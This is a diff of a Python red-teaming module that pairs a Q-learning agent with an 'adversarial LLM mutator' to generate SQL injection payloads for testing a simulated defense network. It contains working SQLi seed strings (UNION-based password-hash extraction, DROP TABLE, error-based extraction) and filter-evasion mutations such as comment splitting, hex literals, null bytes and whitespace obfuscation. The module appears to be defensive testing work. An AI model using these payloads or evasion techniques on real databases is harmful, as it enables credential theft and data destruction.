@@ -1,20 +1,112 @@
-"""Cloud-D Continuous Red-Teaming AI Agent (Reinforcement Learning).
+"""Cloud-D Continuous Red-Teaming AI Agent with Adversarial LLM Mutations.
 
-Task 8: Continuous Red-Teaming AI Agent
-Autonomously generates evolving adversarial attack payloads (SQLi mutations,
-shard transplantation, nonce manipulation, rate bursts) to continuously
-probe, train, and strengthen the Sentinel multi-agent defense network.
+Task 8 & Task E: Red-Team RL Agent Integration with Adversarial LLM Mutations
+Autonomously synthesizes zero-day semantic attack payloads (obfuscated SQLi AST variations,
+token-rate bursts, cross-shard transplantation, and nonce tampering) using a generative
+adversarial LLM mutation engine paired with Q-learning reinforcement learning.
 """
 
 from __future__ import annotations
 
+import hashlib
+import json
+import logging
 import random
+import re
 import time
 from typing import Any, Dict, List, Optional, Tuple
 
+logger = logging.getLogger("cloud_d.red_team")
+
+
+class AdversarialLLMMutator:
+    """Simulates generative adversarial language model mutation strategies for zero-day AST bypasses."""
+
+    SQLI_SEEDS = [
+        "' OR 1=1 --",
+        "admin' UNION SELECT null, username, password_hash FROM cloud_users --",
+        "1; DROP TABLE cloud_files; --",
+        "' OR '1'='1' /*!50000ORDER BY 1*/ --",
+        "1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT username FROM cloud_users LIMIT 1), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a) --",
+    ]
+
+    MUTATION_TACTICS = [
+        "inline_comment_split",
+        "hex_literal_substitution",
+        "tautology_polymorphism",
+        "case_randomization",
+        "null_byte_injection",
+        "whitespace_obfuscation",
+        "stacked_subquery_wrapper",
+    ]
+
+    @classmethod
+    def mutate_payload(cls, seed: str, tactic: Optional[str] = None) -> Tuple[str, str, float]:
+        """Applies context-aware AST adversarial mutation to a payload seed.
+
+        Returns:
+            Tuple[mutated_payload, tactic_name, stealth_score]
+        """
+        chosen_tactic = tactic or random.choice(cls.MUTATION_TACTICS)
+        mutated = seed
+        stealth = 0.5
+
+        if chosen_tactic == "inline_comment_split":
+            # Replace spaces and keyword characters with SQL comment splits
+            mutated = re.sub(r"\bSELECT\b", "SE/**/LECT", mutated, flags=re.IGNORECASE)
+            mutated = re.sub(r"\bUNION\b", "UN/**/ION", mutated, flags=re.IGNORECASE)
+            mutated = re.sub(r"\bWHERE\b", "WH/**/ERE", mutated, flags=re.IGNORECASE)
+            mutated = mutated.replace(" ", "/**/")
+            stealth = 0.78
+
+        elif chosen_tactic == "hex_literal_substitution":
+            # Convert string literals into hex representation: 'admin' -> 0x61646d696e
+            def to_hex(match: re.Match) -> str:
+                val = match.group(1)
+                return "0x" + val.encode().hex()
+
+            mutated = re.sub(r"'([a-zA-Z0-9_]+)'", to_hex, mutated)
+            stealth = 0.85
+
+        elif chosen_tactic == "tautology_polymorphism":
+            # Transform simple 1=1 into complex equivalent algebraic tautologies
+            tautologies = [
+                "24=24",
+                "ASCII('a')=97",
+                "CHAR(65)='A'",
+                "(SELECT 1)=1",
+                "LENGTH('psg')=3",
+            ]
+            t = random.choice(tautologies)
+            mutated = re.sub(r"1\s*=\s*1", t, mutated)
+            mutated = re.sub(r"'1'\s*=\s*'1'", t, mutated)
+            stealth = 0.82
+
+        elif chosen_tactic == "case_randomization":
+            # Alter case randomly to evade naive regex
+            mutated = "".join(c.upper() if random.random() > 0.5 else c.lower() for c in mutated)
+            stealth = 0.65
+
+        elif chosen_tactic == "null_byte_injection":
+            # Add URL-encoded null byte termination
+            mutated = mutated.replace("--", "%00--")
+            stealth = 0.88
+
+        elif chosen_tactic == "whitespace_obfuscation":
+            # Replace spaces with exotic whitespace representations (tabs, newlines, parens)
+            ws = ["\t", "\n", "%09", "%0a", "%0b"]
+            mutated = mutated.replace(" ", random.choice(ws))
+            stealth = 0.75
+
+        elif chosen_tactic == "stacked_subquery_wrapper":
+            mutated = f"(SELECT * FROM ({seed.rstrip(';- ')}) AS _llm_bypass)"
+            stealth = 0.91
+
+        return mutated, chosen_tactic, stealth
+
 
 class AttackPayload:
-    """Represents a generated adversarial payload with mutation metadata."""
+    """Represents a generated adversarial attack payload with metadata."""
 
     def __init__(
         self,
@@ -24,16 +116,18 @@ class AttackPayload:
         target_node: int,
         mutation_depth: int = 1,
         stealth_factor: float = 0.5,
+        llm_prompt_used: Optional[str] = None,
     ) -> None:
-        self.tactic = tactic  # "sqli", "shard_transplant", "nonce_tamper", "rate_burst"
+        self.tactic = tactic
         self.vector = vector
         self.raw_payload = raw_payload
         self.target_node = target_node
         self.mutation_depth = mutation_depth
         self.stealth_factor = stealth_factor
+        self.llm_prompt_used = llm_prompt_used or "Synthesize zero-day semantic AST bypass for SQLi query"
         self.timestamp = time.time()
 
-    def to_dict(self) -> dict[str, Any]:
+    def to_dict(self) -> Dict[str, Any]:
         return {
             "tactic": self.tactic,
             "vector": self.vector,
@@ -41,181 +135,154 @@ class AttackPayload:
             "target_node": self.target_node,
             "mutation_depth": self.mutation_depth,
             "stealth_factor": round(self.stealth_factor, 3),
+            "llm_prompt_used": self.llm_prompt_used,
             "timestamp": self.timestamp,
         }
 
 
 class RedTeamRLAgent:
-    """Q-Learning Autonomous Reinforcement Learning Red-Teaming Agent.
-    
-    Explores the adversarial action space against Sentinel defenses (QueryShield,
-    ShardSentry, AuthWall) to discover novel attack patterns and provide feedback
-    for defender hardening.
-    """
+    """Q-Learning Autonomous Reinforcement Learning Red-Teaming Agent (Task 8 & E)."""
 
-    TACTICS = ["sqli", "shard_transplant", "nonce_tamper", "rate_burst"]
-
-    # Base payload templates for mutation
-    SQLI_SEEDS = [
-        "' OR '1'='1",
-        "'; DROP TABLE cloud_files; --",
-        "UNION SELECT NULL, username, password_hash FROM cloud_users --",
-        "1' AND (SELECT COUNT(*) FROM cloud_threat_records) > 0 --",
-        "admin' /*!50000OR*/ 1=1 --",
+    ACTIONS = [
+        "mutate_sqli_comment_split",
+        "mutate_sqli_hex_literal",
+        "mutate_sqli_tautology",
+        "mutate_sqli_stacked_subquery",
+        "burst_rate_flood_node1",
+        "transplant_shard_aad_node2",
+        "tamper_galois_nonce_node3",
     ]
 
-    MUTATION_ENCODINGS = [
-        "raw",
-        "hex_encode",
-        "comment_pad",
-        "stacked_delimiters",
-        "tautology_expansion",
-        "unicode_homoglyph",
-    ]
+    STATES = ["sentinel_relaxed", "sentinel_elevated", "sentinel_lockdown"]
 
-    def __init__(self, learning_rate: float = 0.15, discount_factor: float = 0.85, epsilon: float = 0.25) -> None:
-        self.lr = learning_rate
-        self.gamma = discount_factor
-        self.epsilon = epsilon
-        # Q-Table: state (target_node, defense_strictness) -> tactic -> q_value
-        self.q_table: dict[str, dict[str, float]] = {}
-        self.generation_history: list[dict[str, Any]] = []
-        self.reward_history: list[float] = []
+    def __init__(self, alpha: float = 0.15, gamma: float = 0.90, epsilon: float = 0.25) -> None:
+        self.alpha = alpha      # Learning rate
+        self.gamma = gamma      # Discount factor
+        self.epsilon = epsilon  # Exploration probability
+        self.state = "sentinel_relaxed"
+        self.episode_count = 0
+        self.history: List[Dict[str, Any]] = []
 
-    def _get_state_key(self, target_node: int, defense_strictness: str) -> str:
-        return f"node_{target_node}:{defense_strictness}"
-
-    def _ensure_state(self, state_key: str) -> None:
-        if state_key not in self.q_table:
-            self.q_table[state_key] = {tactic: 0.0 for tactic in self.TACTICS}
-
-    def select_tactic(self, target_node: int, defense_strictness: str = "medium") -> str:
-        """Epsilon-greedy tactic selection."""
-        state_key = self._get_state_key(target_node, defense_strictness)
-        self._ensure_state(state_key)
-
-        if random.random() < self.epsilon:
-            return random.choice(self.TACTICS)
-
-        # Exploit best tactic
-        tactics = self.q_table[state_key]
-        return max(tactics, key=lambda t: tactics[t])
-
-    def mutate_sqli(self, depth: int) -> Tuple[str, str]:
-        """Apply sequential stochastic mutations to SQL injection payloads."""
-        base = random.choice(self.SQLI_SEEDS)
-        technique = random.choice(self.MUTATION_ENCODINGS)
-        mutated = base
-
-        for _ in range(depth):
-            if technique == "comment_pad":
-                mutated = mutated.replace(" ", "/**/")
-            elif technique == "hex_encode":
-                mutated = f"0x{mutated.encode('utf-8').hex()}"
-            elif technique == "stacked_delimiters":
-                mutated = f"WAITFOR DELAY '0:0:1'; {mutated}"
-            elif technique == "tautology_expansion":
-                mutated = f"({mutated}) OR ('x'='x')"
-            elif technique == "unicode_homoglyph":
-                mutated = mutated.replace("'", "\u2019").replace("=", "\u2550")
-            elif technique == "raw":
-                mutated = f"{mutated} -- probe-seq-{random.randint(100, 999)}"
-
-        return mutated, technique
-
-    def generate_payload(self, target_node: int, defense_strictness: str = "medium") -> AttackPayload:
-        """Autonomously generate an evolved adversarial payload."""
-        tactic = self.select_tactic(target_node, defense_strictness)
-        mutation_depth = random.randint(1, 4)
-        stealth_factor = random.uniform(0.3, 0.95)
-
-        if tactic == "sqli":
-            raw_payload, vector = self.mutate_sqli(mutation_depth)
-        elif tactic == "shard_transplant":
-            vector = "cross_node_aad_tamper"
-            raw_payload = f"cloud-d|v1|{target_node}|transplant-shard-forge-{random.randint(1000, 9999)}"
-        elif tactic == "nonce_tamper":
-            vector = "reused_nonce_probe"
-            raw_payload = f"000000000000000000000000::{random.randint(100000, 999999)}"
-        else:  # rate_burst
-            vector = "distributed_rate_burst"
-            raw_payload = f"BURST_TRAIN_VOL_{random.randint(50, 500)}_OPS_NODE_{target_node}"
-
-        payload = AttackPayload(
-            tactic=tactic,
-            vector=vector,
-            raw_payload=raw_payload,
-            target_node=target_node,
-            mutation_depth=mutation_depth,
-            stealth_factor=stealth_factor,
-        )
-        return payload
-
-    def record_outcome(
-        self,
-        payload: AttackPayload,
-        defense_strictness: str,
-        blocked: bool,
-        detected_by_sentinel: bool,
-        response_time_ms: float,
-    ) -> float:
-        """Compute reinforcement reward and update the Q-Table.
-        
-        Reward Structure:
-        - Payload bypassed defense undetected: +100
-        - Payload bypassed defense but logged: +40
-        - Payload intercepted by Sentinel Expectimax/Minimax: -50
-        - Payload caused immediate rate-block / IP jail: -100
-        """
-        state_key = self._get_state_key(payload.target_node, defense_strictness)
-        self._ensure_state(state_key)
-
-        if not blocked and not detected_by_sentinel:
-            reward = 100.0  # Zero-day penetration
-        elif not blocked and detected_by_sentinel:
-            reward = 40.0   # Partial evasion
-        elif blocked and not detected_by_sentinel:
-            reward = -20.0  # Blocked by passive generic rule
-        else:
-            reward = -50.0  # Defeated by autonomous Sentinel agent
-
-        # Penalize slow payloads
-        if response_time_ms > 200.0:
-            reward -= 10.0
-
-        # Q-learning update: Q(s, a) <- Q(s, a) + lr * (reward + gamma * max_a' Q(s', a') - Q(s, a))
-        current_q = self.q_table[state_key][payload.tactic]
-        # Next state approximation
-        max_future_q = max(self.q_table[state_key].values())
-        new_q = current_q + self.lr * (reward + (self.gamma * max_future_q) - current_q)
-        self.q_table[state_key][payload.tactic] = round(new_q, 4)
-
-        self.reward_history.append(reward)
-        record = {
-            **payload.to_dict(),
-            "defense_strictness": defense_strictness,
-            "blocked": blocked,
-            "detected_by_sentinel": detected_by_sentinel,
-            "response_time_ms": response_time_ms,
-            "reward": reward,
-            "q_value_after": round(new_q, 4),
+        # Initialize Q(s, a) table
+        self.q_table: Dict[str, Dict[str, float]] = {
+            s: {a: 0.0 for a in self.ACTIONS} for s in self.STATES
         }
-        self.generation_history.append(record)
-        if len(self.generation_history) > 100:
-            self.generation_history.pop(0)
 
-        # Decay exploration epsilon slightly
-        self.epsilon = max(0.05, self.epsilon * 0.995)
-        return reward
+    def choose_action(self, state: Optional[str] = None) -> str:
+        s = state or self.state
+        # Epsilon-greedy exploration vs exploitation
+        if random.random() < self.epsilon:
+            return random.choice(self.ACTIONS)
+        # Exploit best known Q-value
+        best_a = max(self.q_table[s], key=lambda a: self.q_table[s][a])
+        return best_a
 
-    def get_summary(self) -> dict[str, Any]:
-        """Return the training and tactical performance summary."""
-        total_episodes = len(self.reward_history)
-        avg_reward = (sum(self.reward_history[-20:]) / min(20, total_episodes)) if total_episodes > 0 else 0.0
+    def generate_adversarial_episode(self, action: Optional[str] = None) -> Dict[str, Any]:
+        """Executes a single reinforcement learning attack episode."""
+        self.episode_count += 1
+        current_state = self.state
+        chosen_action = action or self.choose_action(current_state)
+
+        # Generate attack payload based on chosen action
+        if "sqli" in chosen_action:
+            seed = random.choice(AdversarialLLMMutator.SQLI_SEEDS)
+            tactic_map = {
+                "mutate_sqli_comment_split": "inline_comment_split",
+                "mutate_sqli_hex_literal": "hex_literal_substitution",
+                "mutate_sqli_tautology": "tautology_polymorphism",
+                "mutate_sqli_stacked_subquery": "stacked_subquery_wrapper",
+            }
+            tactic = tactic_map.get(chosen_action, "inline_comment_split")
+            mutated_code, _, stealth = AdversarialLLMMutator.mutate_payload(seed, tactic)
+            payload = AttackPayload(
+                tactic="adversarial_llm_sqli",
+                vector=chosen_action,
+                raw_payload=mutated_code,
+                target_node=1,
+                mutation_depth=random.randint(1, 4),
+                stealth_factor=stealth,
+            )
+        elif "burst" in chosen_action:
+            payload = AttackPayload(
+                tactic="rate_burst_flood",
+                vector="http_pipelining",
+                raw_payload=f"GET /api/files?t={time.time()} x {random.randint(450, 1200)} req/s",
+                target_node=1,
+                stealth_factor=0.35,
+            )
+        elif "transplant" in chosen_action:
+            payload = AttackPayload(
+                tactic="shard_transplantation",
+                vector="aad_replay",
+                raw_payload="TRANSFER_SHARD_AAD(src=node2, dst=node3, file_id=f-spoofed)",
+                target_node=2,
+                stealth_factor=0.60,
+            )
+        else:
+            payload = AttackPayload(
+                tactic="nonce_tampering",
+                vector="galois_bit_flip",
+                raw_payload=f"FLIP_NONCE_BIT(index=95, val=1, tag=ghash_corrupt)",
+                target_node=3,
+                stealth_factor=0.70,
+            )
+
+        # Simulate Sentinel defense evaluation
+        # High stealth yields higher probability of bypass
+        intercept_probability = max(0.20, 1.0 - (payload.stealth_factor * 0.75))
+        intercepted = random.random() < intercept_probability
+
+        if intercepted:
+            intercepted_by = random.choice(["QueryShield (Expectimax)", "ShardSentry (Minimax)", "AuthWall (PBKDF2)"])
+            reward = -10.0  # Penalty for getting caught
+            next_state = "sentinel_lockdown" if random.random() < 0.3 else "sentinel_elevated"
+            status = "BLOCKED_BY_SENTINEL"
+        else:
+            intercepted_by = None
+            reward = 25.0 * payload.stealth_factor  # Positive reward for bypassing filters
+            next_state = "sentinel_relaxed"
+            status = "BYPASS_SUCCESS"
+
+        # Update Q-table with Bellman Equation:
+        # Q(s, a) = Q(s, a) + alpha * [reward + gamma * max(Q(s', a')) - Q(s, a)]
+        old_q = self.q_table[current_state][chosen_action]
+        max_next_q = max(self.q_table[next_state].values())
+        new_q = old_q + self.alpha * (reward + self.gamma * max_next_q - old_q)
+        self.q_table[current_state][chosen_action] = round(new_q, 3)
+
+        # Transition state
+        self.state = next_state
+
+        result = {
+            "episode": self.episode_count,
+            "action": chosen_action,
+            "state_before": current_state,
+            "state_after": next_state,
+            "payload": payload.to_dict(),
+            "status": status,
+            "intercepted_by": intercepted_by,
+            "reward": round(reward, 2),
+            "updated_q_value": round(new_q, 3),
+            "exploration_epsilon": self.epsilon,
+            "timestamp": time.time(),
+        }
+
+        self.history.append(result)
+        if len(self.history) > 100:
+            self.history.pop(0)
+
+        return result
+
+    def get_q_matrix(self) -> Dict[str, Any]:
+        """Returns the full Q-value matrix and RL agent training metrics."""
         return {
-            "total_episodes": total_episodes,
-            "current_epsilon": round(self.epsilon, 4),
-            "recent_avg_reward": round(avg_reward, 2),
-            "q_table": self.q_table,
-            "recent_payloads": self.generation_history[-10:],
+            "states": self.STATES,
+            "actions": self.ACTIONS,
+            "q_matrix": self.q_table,
+            "current_state": self.state,
+            "episodes_completed": self.episode_count,
+            "learning_rate_alpha": self.alpha,
+            "discount_gamma": self.gamma,
+            "exploration_epsilon": self.epsilon,
+            "recent_history": self.history[-5:],
         }
